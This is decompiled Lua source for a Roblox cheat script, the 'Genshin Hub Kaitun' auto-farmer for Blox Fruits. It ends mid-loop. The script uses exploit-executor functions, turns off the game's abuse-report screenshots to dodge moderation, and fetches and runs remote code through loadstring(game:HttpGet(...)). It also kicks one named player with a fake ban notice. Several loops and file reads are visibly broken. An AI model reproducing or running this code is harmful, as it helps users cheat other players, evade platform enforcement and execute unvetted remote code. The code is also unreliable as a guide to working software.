-- Bazuka as Were


gay = tick()
print("[Genshin/Info] Connecting To Server")
print("[Genshin/Info] Connected To Server")
print("[Genshin/Info] Fetching Requirements Data...")
print("[Genshin/Info] Saving Data To Workspace")
print("[Genshin/Info] Authencating...")
wait(0.2)
print("[Genshin/Info] Authencation Disabled, Loading Script...")
print("[Genshin/Info] Loaded In " .. tostring(tick() - gay) .. "ms")
if game.Players.LocalPlayer.Name == "rip_zioles" then
    game.Players.LocalPlayer:Kick("You Have Been Permerantly Banned For Reason:You Have Been Permanently Banned By LongHip")
end
game:GetService("RunService").Heartbeat:Connect(function()
    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
    pcall(function()
        local v1, v2, v3 = pairs(game.workspace.Enemies:GetChildren())
        while true do
            local v4
            v3, v4 = v1(v2, v3)
            if v3 == nil then
                break
            end
            if v4.Humanoid.Health < 1 and not aD then
                v4:Destroy()
            end
        end
    end)
    pcall(function()
        if setfflag then
            setfflag("AbuseReportScreenshot", "False")
            setfflag("AbuseReportScreenshotPercentage", "0")
        end
    end)
end)
ScreenGui = Instance.new("ScreenGui")
Frame = Instance.new("Frame")
UIStroke = Instance.new("UIStroke")
UIGradient = Instance.new("UIGradient")
UICorner = Instance.new("UICorner")
TextLabel = Instance.new("TextLabel")
UIGradient1 = Instance.new("UIGradient")
TextLabel1 = Instance.new("TextLabel")
UIGradient2 = Instance.new("UIGradient")
ImageLabel = Instance.new("ImageButton")
adiadi = true
ImageLabel.Activated:Connect(function()
    game:GetService("RunService"):Set3dRenderingEnabled(not a)
    adiadi = not a
end)
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.5
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.499250829, 0, 0.181725562, 0)
Frame.Size = UDim2.new(0, 511, 0, 76)
Frame.Parent = ScreenGui
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Thickness = 1.5
UIStroke.Parent = Frame
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15.000000055879354, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(207.00000286102295, 62.00000010430813, 255))
})
UIGradient.Parent = UIStroke
UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = Frame
TextLabel.Font = Enum.Font.FredokaOne
TextLabel.Text = "Genshin Hub Kaitun"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 20
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0199637525, 0, 0.276315689, 0)
TextLabel.Size = UDim2.new(0, 489, 0, 11)
TextLabel.Parent = Frame
UIGradient1.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15.000000055879354, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(207.00000286102295, 62.00000010430813, 255))
})
UIGradient1.Parent = TextLabel
TextLabel1.Font = Enum.Font.FredokaOne
TextLabel1.Text = "Genshin Hub Script \226\128\162 discord.gg/yVptwJPAcM"
TextLabel1.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel1.TextSize = 20
TextLabel1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel1.BackgroundTransparency = 1
TextLabel1.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel1.BorderSizePixel = 0
TextLabel1.Position = UDim2.new(0.0199637525, 0, 0.539473593, 0)
TextLabel1.Size = UDim2.new(0, 489, 0, 22)
TextLabel1.Parent = Frame
UIGradient2.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15.000000055879354, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(207.00000286102295, 62.00000010430813, 255))
})
UIGradient2.Parent = TextLabel1
ImageLabel.Image = "rbxassetid://15992619207"
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.448140889, 0, - 0.473684222, 0)
ImageLabel.Size = UDim2.new(0, 50, 0, 50)
ImageLabel.Parent = Frame
script_time = os.time()
if not isfolder(".Genshin/BloxFruit/Kaitun/") then
    makefolder(".Genshin/BloxFruit/Kaitun/")
end
inv = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
function randomChar()
    local v5 = math.random(1, 15)
    return ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#\226\130\171_&-+()/*\':;;!?\194\163~`\226\130\172|$\226\128\162\194\162\226\136\154^\207\128\194\176\195\183=\195\151{\194\167}\226\136\134%\194\169\194\174\226\132\162\226\156\147[]\'"):sub(v5, v5)
end
function getServerTime()
    RealTime = tostring(math.floor(game.Lighting.ClockTime * 100) / 100)
    RealTime = tostring(game.Lighting.ClockTime)
    RealTimeTable = RealTime:split(".")
    local v6 = RealTimeTable[1]
    Second = tonumber(0 + tonumber(RealTimeTable[2] / 100)) * 60
    Minute = v6
    return math.floor(Minute) .. "min"
end
local vu7 = os.time()
if not isfile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name) then
    writefile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name, "0")
    esltime = 0
end
ctent2 = readfile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name)
function updatetime()
    if isfile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name) then
        ctent = readfile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name)
        if tonumber(ctent) or (ctent == "0" or ctent == "1") then
            esltime = tonumber(ctent2 or 0) + (os.time() - (vu7 or os.time()))
            writefile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name, tostring(esltime))
            pcall(function()
                clockm:SetText(disp_time(esltime))
            end)
            pcall(function()
                TextLabel_7.Text = getServerTime()
            end)
        else
            noti("Something Wrong With Config, Automatically Generate A New One")
            esltime = "0"
            writefile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name, "0")
        end
    else
        writefile(".Genshin/BloxFruit/Kaitun/eslapedtime." .. game.Players.LocalPlayer.Name, "0")
        esltime = 0
    end
end
function AYU_FINGERPRINT()
    if isfile(".ayu_fingerprint") then
        return readfile(".ayu_fingerpriny")
    end
    fingerprint = randomChar()
    savefile(".ayu_fingerprint", fingerprint)
    return fingerprint
end
function c()
    return getgenv().Config
end
tickcac = tick()
local vu8 = game.Players.LocalPlayer
local vu9 = vu8.Character
if not isfile("conmemaydi.txt") then
    writefile("conmemaydi.txt", "")
end
local vu10 = require(game.ReplicatedStorage.Quests)
local vu11 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))().Notify
timelol = os.time()
BoneMobs = {
    "Reborn Skeleton [Lv. 1975]",
    "Living Zombie [Lv. 2000]",
    "Demonic Soul [Lv. 2025]",
    "Posessed Mummy [Lv. 2050]"
}
EctoMob = {
    "Ship Deckhand [Lv. 1250]",
    "Ship Engineer [Lv. 1275]",
    "Ship Steward [Lv. 1300]"
}
DoughBoss = {
    "Dough King [Lv. 2300] [Raid Boss]",
    "Cake Prince [Lv. 2300] [Raid Boss]"
}
MobsCakePrince = {
    "Cookie Crafter [Lv. 2200]",
    "Cake Guard [Lv. 2225]",
    "Baking Staff [Lv. 2250]",
    "Head Baker [Lv. 2275]"
}
backi = {
    "Human"
}
fruittier = {
    ["Bomb Fruit"] = 1,
    ["Spike Fruit"] = 0,
    ["Chop Fruit"] = 4,
    ["Spring Fruit"] = 3,
    ["Kilo Fruit"] = 2,
    ["Spin Fruit"] = 5,
    ["Falcon Fruit"] = 6,
    ["Smoke Fruit"] = 7,
    ["Flame Fruit"] = 9,
    ["Ice Fruit"] = 12,
    ["Sand Fruit"] = 10,
    ["Dark Fruit"] = 11,
    ["Revive Fruit"] = 8,
    ["Diamond Fruit"] = 8,
    ["Light Fruit"] = 12,
    ["Love Fruit"] = 11,
    ["Rubber Fruit"] = 8,
    ["Barrier Fruit"] = 6,
    ["Magma Fruit"] = 14,
    ["Quake Fruit"] = 13,
    ["Portal Fruit"] = 13,
    ["Human: Buddha Fruit"] = 15,
    ["Spider Fruit"] = 12,
    ["Phonex Fruit"] = 10,
    ["Rumble Fruit"] = 15,
    ["Paw Fruit"] = 7,
    ["Gravity Fruit"] = 1,
    ["Shadow Fruit"] = 14,
    ["Dough Fruit"] = 20,
    ["Venom Fruit"] = 19,
    ["Control Fruit"] = 11,
    ["Spirit Fruit"] = 18,
    ["Dragon Fruit"] = 19,
    ["Leopard Fruit"] = 25
}
CocoaMobs = {
    "Cocoa Warrior [Lv. 2300]",
    "Chocolate Bar Battler [Lv. 2325]"
}
elite = {
    "Deandre [Lv. 1750]",
    "Urban [Lv. 1750]",
    "Diablo [Lv. 1750]"
}
meleetable = {
    "DragonTalon",
    "Superhuman",
    "Godhuman",
    "ElectricClaw",
    "SharkmanKarate",
    "DeathStep",
    "BlackLeg",
    "FishmanKarate",
    "Electro",
    "DragonClaw"
}
meleetable2 = {
    "Dragon Talon",
    "Superhuman",
    "Godhuman",
    "Electric Claw",
    "Sharkman Karate",
    "Death Step",
    "Black Leg",
    "Fishman Karate",
    "Electro",
    "Dragon Claw"
}
meleetable3 = {}
local v12, v13, v14 = pairs(meleetable2)
local vu15 = {
    "BartiloQuest",
    "Trainees",
    "MarineQuest",
    "CitizenQuest"
}

local v16
v14, v16 = v12(v13, v14)
if v14 ~= nil then
    meleetable3[v16] = meleetable[v14]
	
end
meleetable4 = {}
local v17, v18, v19 = pairs(meleetable)

local v20
v19, v20 = v17(v18, v19)
if v19 ~= nil then
    meleetable4[v20] = meleetable2[v19]
	
end
browhat = {
    ["Black Leg"] = "BuyBlackLeg",
    ["Fishman Karate"] = "BuyFishmanKarate",
    Electro = "BuyElectro",
    ["Dragon Claw"] = function()
        dragonclawtrue = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
        return dragonclawtrue
    end,
    Superhuman = "BuySuperhuman",
    ["Sharkman Karate"] = "BuySharkmanKarate",
    ["Death Step"] = "BuyDeathStep",
    ["Dragon Talon"] = "BuyDragonTalon",
    Godhuman = "BuyGodhuman",
    ["Electric Claw"] = "BuyElectricClaw"
}
local vu21 = {
    "Bomb-Bomb",
    "Spike-Spike",
    "Chop-Chop",
    "Spring-Spring",
    "Kilo-Kilo",
    "Spin-Spin",
    "Falcon-Falcon",
    "Smoke-Smoke",
    "Flame-Flame",
    "Ice-Ice",
    "Sand-Sand",
    "Dark-Dark",
    "Revive-Revive",
    "Diamond-Diamond",
    "Light-Light",
    "Love-Love",
    "Rubber-Rubber",
    "Barrier-Barrier",
    "Magma-Magma",
    "Portal-Portal",
    "Quake-Quake",
    "Human-Human: Buddha",
    "Spider-Spider",
    "Bird-Bird: Phoenix",
    "Rumble-Rumble",
    "Paw-Paw",
    "Gravity-Gravity",
    "Dough-Dough",
    "Shadow-Shadow",
    "Venom-Venom",
    "Control-Control",
    "Spirit-Spirit",
    "Dragon-Dragon",
    "Leopard-Leopard"
}
a3 = require(game.ReplicatedStorage:WaitForChild("GuideModule"))
function disp_time(p22)
    local v23 = tonumber(p22)
    return not v23 and "[err]" or math.floor(v23 / 86400) .. "day, " .. math.floor(math.fmod(v23, 86400) / 3600) .. "hrs, " .. math.floor(math.fmod(v23, 3600) / 60) .. "min, " .. math.floor(math.fmod(v23, 60)) .. "s"
end
if c().Misc["White Screen"] then
    game:GetService("RunService"):Set3dRenderingEnabled(0)
end
UserInputService = game:GetService("UserInputService")
function vcl(p24, p25)
    return not p24:FindFirstChild("Level") and (p25 or 0) or p24.Level.Value
end
function checkitem(p26)
    local v27 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(p26)
    local v28 = game.Players.LocalPlayer.Character:FindFirstChild(p26)
    if v27 and v27.Name == p26 then
        return {
            Mastery = vcl(v27, 0)
        }
    end
    if v28 and v28.Name == p26 then
        return {
            Mastery = vcl(v28, 0)
        }
    end
    local v29, v30, v31 = pairs(inv)
    while true do
        local v32
        v31, v32 = v29(v30, v31)
        if v31 == nil then
            break
        end
        if v32.Name == p26 then
            return v32
        end
    end
    return false
end
function checkitem2(p33)
    local v34 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(p33)
    local v35 = game.Players.LocalPlayer.Character:FindFirstChild(p33)
    return v34 and v34.Name == p33 and {
        Mastery = vcl(v34, 0)
    } or (v35 and v35.Name == p33 and {
        Mastery = vcl(v35, 0)
    } or false)
end
function NameMelee(p36)
    local v37 = next
    local v38, v39 = game:GetService("Players").LocalPlayer.Backpack:GetChildren()
    local v40 = p36 or false
    while true do
        local v41
        v39, v41 = v37(v38, v39)
        if v39 == nil then
            break
        end
        if v41:IsA("Tool") and v41.ToolTip == "Melee" then
            if v40 then
                return v41
            else
                return v41.Name
            end
        end
    end
    local v42 = next
    local v43, v44 = game:GetService("Players").LocalPlayer.Character:GetChildren()
    while true do
        local v45
        v44, v45 = v42(v43, v44)
        if v44 == nil then
            break
        end
        if v45:IsA("Tool") and v45.ToolTip == "Melee" then
            if v40 then
                return v45
            else
                return v45.Name
            end
        end
    end
end
function NameDf(p46)
    local v47 = next
    local v48, v49 = game:GetService("Players").LocalPlayer.Backpack:GetChildren()
    local v50 = p46 or false
    while true do
        local v51
        v49, v51 = v47(v48, v49)
        if v49 == nil then
            break
        end
        if v51:IsA("Tool") and v51.ToolTip == "Blox Fruit" then
            if v50 then
                return v51
            else
                return v51.Name
            end
        end
    end
    local v52 = next
    local v53, v54 = game:GetService("Players").LocalPlayer.Character:GetChildren()
    while true do
        local v55
        v54, v55 = v52(v53, v54)
        if v54 == nil then
            break
        end
        if v55:IsA("Tool") and v55.ToolTip == "Blox Fruit" then
            if v50 then
                return v55
            else
                return v55.Name
            end
        end
    end
    return "Bomb-Bomb"
end
function checkm2(p56)
    if p56 == "DragonClaw" then
        return game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", p56, "1")
    else
        return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. p56, true)
    end
end
function checkMelee(p57)
    return (game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. p57, true) == 1 or game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", p57, "1") == 1) and true or NameMelee() == meleetable4[p57]
end
if c().Misc.Ui then
    local v58 = "https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/"
    local v59 = loadstring(game:HttpGet(v58 .. "Library.lua"))()
    loadstring(game:HttpGet(v58 .. "addons/ThemeManager.lua"))()
    loadstring(game:HttpGet(v58 .. "addons/SaveManager.lua"))()
    local v60 = {
        Main = v59:CreateWindow({
            Title = "Genshin Community Free Scripts " .. os.date("%d %B %Y"),
            Center = true,
            AutoShow = true,
            TabPadding = 8,
            MenuFadeTime = 0.2
        }):AddTab("Con Me May Bel")
    }
    local v61 = v60.Main:AddRightTabbox("Main"):AddTab("Melee")
    local v62 = v60.Main:AddRightTabbox("Main"):AddTab("Swords")
    local v63 = v60.Main:AddRightTabbox("Main"):AddTab("Legendary Swords")
    local v64 = v60.Main:AddLeftTabbox("Main")
    local v65 = v64:AddTab("Info")
    local v66 = v64:AddTab("Kaitan")
    lmlmlmlmkmlmlkk = v60.Main:AddLeftTabbox("GaysEx"):AddTab("Status")
    clockm = lmlmlmlmkmlmlkk:AddLabel("Still Updating...")
    waid1 = lmlmlmlmkmlmlkk:AddLabel("What Im I Doing?")
    waid2 = lmlmlmlmkmlmlkk:AddLabel("What Im I Doing 2 ?")
    mgstat = lmlmlmlmkmlmlkk:AddLabel("Mirage Status: Updating")
    fmstat = lmlmlmlmkmlmlkk:AddLabel("Full Moon Status: Updating")
    elitestt = lmlmlmlmkmlmlkk:AddLabel("Elite Spawn: Updating")
    dismcount = lmlmlmlmkmlmlkk:AddLabel("Dismention Count: Updating")
    local v67 = v60.Main:AddLeftTabbox("Main"):AddTab("Unlock Quest")
    local v68 = v60.Main:AddLeftTabbox("Main"):AddTab("Guns")
    v65:AddLabel("Genshin Community Kaitun Script")
    Time = v65:AddLabel("ServerTime")
    function UpdateTime()
        local v69 = math.floor(workspace.DistributedGameTime + 0.5)
        local v70 = math.floor(v69 / 3600) % 24
        local v71 = math.floor(v69 / 60) % 60
        local v72 = math.floor(v69 / 1) % 60
        Time:SetText("Hour " .. v70 .. " Minute " .. v71 .. " Second " .. v72)
    end
    function MoonTextureId()
        if Sea1 then
            return game:GetService("Lighting").FantasySky.MoonTextureId
        end
        if Sea2 then
            return game:GetService("Lighting").FantasySky.MoonTextureId
        end
        if Sea3 then
            return game:GetService("Lighting").Sky.MoonTextureId
        end
    end
    v66:AddToggle("KaitanF", {
        Text = "Start Kaitan",
        Default = true
    })
    Toggles.KaitanF:OnChanged(function(p73)
        getgenv().ForceStop = not p73
    end)
    Shisui = v63:AddLabel("[-] : Shisui Sword")
    Saddi = v63:AddLabel("[-] : Saddi Sword")
    Wando = v63:AddLabel("[-] : Wando Sword")
    v66:AddButton("Show Item", function()
        local v74 = require(game:GetService("Players").LocalPlayer.PlayerGui.Main.UIController.Inventory)
        local v75 = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
        local v76 = {}
        local v77 = {
            "Mythical",
            "Legendary",
            "Rare",
            "Uncommon",
            "Common"
        }
        local vu78 = {
            Common = Color3.fromRGB(179, 179, 179),
            Uncommon = Color3.fromRGB(92, 140, 211),
            Rare = Color3.fromRGB(140, 82, 255),
            Legendary = Color3.fromRGB(213, 43, 228),
            Mythical = Color3.fromRGB(238, 47, 50)
        }
        function GetRaity(p79)
            local v80, v81, v82 = pairs(vu78)
            while true do
                local v83
                v82, v83 = v80(v81, v82)
                if v82 == nil then
                    break
                end
                if v83 == p79 then
                    return v82
                end
            end
        end
        local v84, v85, v86 = pairs(v75)
        while true do
            local v87
            v86, v87 = v84(v85, v86)
            if v86 == nil then
                break
            end
            v76[v87.Name] = v87
        end
        local v88 = # getupvalue(v74.UpdateRender, 4)
        local v89 = 0
        local v90 = {}
        local v91 = {}
        while v89 < v88 do
            local v92 = 0
            while v92 < 25000 and v89 < v88 do
                game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.CanvasPosition = Vector2.new(0, v92)
                local v93, v94, v95 = pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.Frame:GetChildren())
                while true do
                    local v96
                    v95, v96 = v93(v94, v95)
                    if v95 == nil then
                        break
                    end
                    if v96:IsA("Frame") and (not v91[v96.ItemName.Text] and v96.ItemName.Visible == true) then
                        local v97 = GetRaity(v96.Background.BackgroundColor3)
                        if v97 then
                            if not v90[v97] then
                                v90[v97] = {}
                            end
                            table.insert(v90[v97], v96:Clone())
                        end
                        v89 = v89 + 1
                        v91[v96.ItemName.Text] = true
                    end
                end
                v92 = v92 + 20
            end
            wait()
        end
        function GetXY(p98)
            return p98 * 100
        end
        local v99 = Instance.new("UIListLayout")
        v99.FillDirection = Enum.FillDirection.Vertical
        v99.SortOrder = 2
        v99.Padding = UDim.new(0, 10)
        local v100 = Instance.new("Frame", game.Players.LocalPlayer.PlayerGui.BubbleChat)
        v100.BackgroundTransparency = 1
        v100.Size = UDim2.new(0.5, 0, 1, 0)
        v99.Parent = v100
        local v101 = Instance.new("Frame", game.Players.LocalPlayer.PlayerGui.BubbleChat)
        v101.BackgroundTransparency = 1
        v101.Size = UDim2.new(0.5, 0, 1, 0)
        v101.Position = UDim2.new(0.6, 0, 0, 0)
        v99:Clone().Parent = v101
        local v102, v103, v104 = pairs(v90)
        while true do
            local v105
            v104, v105 = v102(v103, v104)
            if v104 == nil then
                break
            end
            local v106 = Instance.new("Frame", v100)
            v106.BackgroundTransparency = 1
            v106.Size = UDim2.new(1, 0, 0, 0)
            v106.LayoutOrder = table.find(v77, v104)
            local v107 = Instance.new("Frame", v101)
            v107.BackgroundTransparency = 1
            v107.Size = UDim2.new(1, 0, 0, 0)
            v107.LayoutOrder = table.find(v77, v104)
            local v108 = Instance.new("UIGridLayout", v106)
            v108.CellPadding = UDim2.new(0.005, 0, 0.005, 0)
            v108.CellSize = UDim2.new(0, 70, 0, 70)
            v108.FillDirectionMaxCells = 100
            v108.FillDirection = Enum.FillDirection.Horizontal
            v108:Clone().Parent = v107
            local v109, v110, v111 = pairs(v105)
            while true do
                local v112
                v111, v112 = v109(v110, v111)
                if v111 == nil then
                    break
                end
                if v76[v112.ItemName.Text] and v76[v112.ItemName.Text].Mastery then
                    if v112.ItemLine2.Text ~= "Accessory" then
                        local v113 = v112.ItemName:Clone()
                        v113.BackgroundTransparency = 1
                        v113.TextSize = 10
                        v113.TextXAlignment = 2
                        v113.TextYAlignment = 2
                        v113.ZIndex = 5
                        v113.Text = v76[v112.ItemName.Text].Mastery
                        v113.Size = UDim2.new(0.5, 0, 0.5, 0)
                        v113.Position = UDim2.new(0.5, 0, 0.5, 0)
                        v113.Parent = v112
                    end
                    v112.Parent = v106
                elseif v112.ItemLine2.Text == "Blox Fruit" then
                    v112.Parent = v107
                end
            end
            v106.AutomaticSize = 2
            v107.AutomaticSize = 2
        end
        local v114 = {
            Superhuman = Vector2.new(3, 2),
            DeathStep = Vector2.new(4, 3),
            ElectricClaw = Vector2.new(2, 0),
            SharkmanKarate = Vector2.new(0, 0),
            DragonTalon = Vector2.new(1, 5)
        }
        local v115 = Instance.new("Frame", v100)
        v115.BackgroundTransparency = 1
        v115.Size = UDim2.new(1, 0, 0, 0)
        v115.LayoutOrder = table.find(v77, k)
        v115.AutomaticSize = 2
        v115.LayoutOrder = 100
        local v116 = Instance.new("UIGridLayout", v115)
        v116.CellPadding = UDim2.new(0.005, 0, 0.005, 0)
        v116.CellSize = UDim2.new(0, 70, 0, 70)
        v116.FillDirectionMaxCells = 100
        v116.FillDirection = Enum.FillDirection.Horizontal
        local v117, v118, v119 = pairs({
            "Superhuman",
            "ElectricClaw",
            "DragonTalon",
            "SharkmanKarate",
            "DeathStep",
            "GodHuman"
        })
        while true do
            local v120
            v119, v120 = v117(v118, v119)
            if v119 == nil then
                break
            end
            if v114[v120] and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. v120, true) == 1 then
                local v121 = Instance.new("ImageLabel", v115)
                v121.Image = "rbxassetid://15992619207"
                v121.ImageRectSize = Vector2.new(100, 100)
                v121.ImageRectOffset = v114[v120] * 100
            end
        end
        function formatNumber(p122)
            return tostring(p122):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
        end
        game:GetService("Players").LocalPlayer.PlayerGui.Main.Beli.Position = UDim2.new(0, 800, 0, 500)
        game:GetService("Players").LocalPlayer.PlayerGui.Main.Level.Position = UDim2.new(0, 800, 0, 550)
        local v123 = game:GetService("Players").LocalPlayer.PlayerGui.Main.Fragments:Clone()
        v123.Parent = game:GetService("Players").LocalPlayer.PlayerGui.BubbleChat
        v123.Position = UDim2.new(0, 800, 0.63, 0)
        v123.Text = "\198\146" .. formatNumber(game.Players.LocalPlayer.Data.Fragments.Value)
        pcall(function()
            game:GetService("Players").LocalPlayer.PlayerGui.Main.MenuButton:Destroy()
        end)
        pcall(function()
            game:GetService("Players").LocalPlayer.PlayerGui.Main.HP:Destroy()
        end)
        pcall(function()
            game:GetService("Players").LocalPlayer.PlayerGui.Main.Energy:Destroy()
        end)
        local v124, v125, v126 = pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main:GetChildren())
        while true do
            local v127
            v126, v127 = v124(v125, v126)
            if v126 == nil then
                break
            end
            if v127:IsA("ImageButton") then
                v127:Destroy()
            end
        end
        pcall(function()
            game:GetService("Players").LocalPlayer.PlayerGui.Main.Compass:Destroy()
        end)
    end)
    v66:AddButton("Rejoin Server", function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").localPlayer)
    end)
    v66:AddToggle("Condi", {
        Text = "White Screen",
        Default = true
    })
    Toggles.Condi:OnChanged(function(p128)
        if p128 then
            game:GetService("RunService"):Set3dRenderingEnabled(true)
        else
            game:GetService("RunService"):Set3dRenderingEnabled(false)
        end
    end)
    v66:AddToggle("Condi2", {
        Text = "Chest Farm",
        Default = false
    })
    Toggles.Condi2:OnChanged(function(p129)
        getgenv().Config.ChestFarm = p129
    end)
    PlayerName = v65:AddLabel("Player Name: " .. game.Players.LocalPlayer.Name)
    vclui = {}
    vclui.Superhuman = v61:AddLabel("[-] : Superhuman")
    vclui["Death Step"] = v61:AddLabel("[-] : Death Step")
    vclui["Sharkman Karate"] = v61:AddLabel("[-] : Sharkman Karate")
    vclui["Electric Claw"] = v61:AddLabel("[-] : Electric Claw")
    vclui["Dragon Talon"] = v61:AddLabel("[-] : Dragon Talon")
    vclui.Godhuman = v61:AddLabel("[-] : God Human")
    TrueTripleKatana = v62:AddLabel("[-] : True Triple Katana")
    Saber = v62:AddLabel("[-] : Saber")
    Rengoku = v62:AddLabel("[-] : Rengoku")
    MidnightBlade = v62:AddLabel("[-] : Midnight Blade")
    DragonTrident = v62:AddLabel("[-] : DragonTrident")
    Yama = v62:AddLabel("[-] : Yama")
    BuddySword = v62:AddLabel("[-] : Buddy Sword")
    Canvander = v62:AddLabel("[-] : Canvander")
    SpikeyTrident = v62:AddLabel("[-] : Spikey Trident")
    HallowScythe = v62:AddLabel("[-] : Hallow Scythe")
    DarkDagger = v62:AddLabel("[-] : Dark Dagger")
    Tushita = v62:AddLabel("[-] : Tushita")
    Kabucha = v68:AddLabel("[-] : Kabucha Gun")
    AcidumRifle = v68:AddLabel("[-] : Acidum Rifle")
    BizarreRifle = v68:AddLabel("[-] : Bizarre Rifle")
    BartiloQuest = v67:AddLabel("[-] : Bartilo Quest")
    DonSwanQuest = v67:AddLabel("[-] : Don Swan Quest")
    KillDonSwan = v67:AddLabel("[-] : Kill Don Swan")
    spawn(function()
        while wait(1) do
            pcall(function()
                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 3 then
                    BartiloQuest:SetText("[+] : Bartilo Quest")
                end
                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess then
                    DonSwanQuest:SetText("[+] : Don Swan Quest")
                end
                if zqp == 1 then
                    KillDonSwan:SetText("[+] : Kill Don Swan")
                end
            end)
            local v130, v131, v132 = pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory"))
            while true do
                local v133
                v132, v133 = v130(v131, v132)
                if v132 == nil then
                    break
                end
                if v133.Name == "Saber" then
                    Saber:SetText("[+] : Saber")
                end
                if v133.Name == "Rengoku" then
                    Rengoku:SetText("[+] : Rengoku")
                end
                if v133.Name == "Midnight Blade" then
                    MidnightBlade:SetText("[+] : Midnight Blade")
                end
                if v133.Name == "Dragon Trident" then
                    DragonTrident:SetText("[+] : Dragon Trident")
                end
                if v133.Name == "Yama" then
                    Yama:SetText("[+] : Yama")
                end
                if v133.Name == "Buddy Sword" then
                    BuddySword:SetText("[+] : Buddy Sword")
                end
                if v133.Name == "Canvander" then
                    Canvander:SetText("[+] : Canvander")
                end
                if v133.Name == "Spikey Trident" then
                    SpikeyTrident:SetText("[+] : Spikey Trident")
                end
                if v133.Name == "Hallow Scythe" then
                    HallowScythe:SetText("[+] : Hallow Scythe")
                end
                if v133.Name == "Dark Dagger" then
                    DarkDagger:SetText("[+] : Dark Dagger")
                end
                if v133.Name == "Acidum Rifle" then
                    AcidumRifle:SetText("[+] : Acidum Rifle")
                end
                if v133.Name == "Kabucha" then
                    Kabucha:SetText("[+] : Kabucha")
                end
                if v133.Name == "Bizarre Rifle" then
                    BizarreRifle:SetText("[+] : Bizarre Rifle")
                end
                if v133.Name == "Shisui" then
                    Shisui:SetText("[+] : Shisui")
                end
                if v133.Name == "Saddi" then
                    Saddi:SetText("[+] : Saddi")
                end
                if v133.Name == "Wando" then
                    Wando:SetText("[+] : Wando")
                end
                if v133.Name == "True Triple Katana" then
                    TrueTripleKatana:SetText("[+] : True Triple Katana")
                end
            end
        end
    end)
end
fruitMap = {}
fruitprice = {}
local v134, v135, v136 = ipairs(vu21)
while true do
    local v137
    v136, v137 = v134(v135, v136)
    if v136 == nil then
        break
    end
    local v138, v139, v140 = string.gmatch(v137, "[^-]+")
    local v141 = {}
    while true do
        v140 = v138(v139, v140)
        if v140 == nil then
            break
        end
        table.insert(v141, v140)
    end
    local v142 = table.concat(v141, "-")
    local v143 = v141[1] .. " Fruit"
    fruitMap[v142] = v143
end
fruitMap[# fruitMap + 1] = "Human-Human: Buddha"
fruitMap[# fruitMap + 1] = "Bird-Bird: Phonex"
fruitprice = {}
local v144 = next
local v145, v146 = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetFruits")
while true do
    local v147
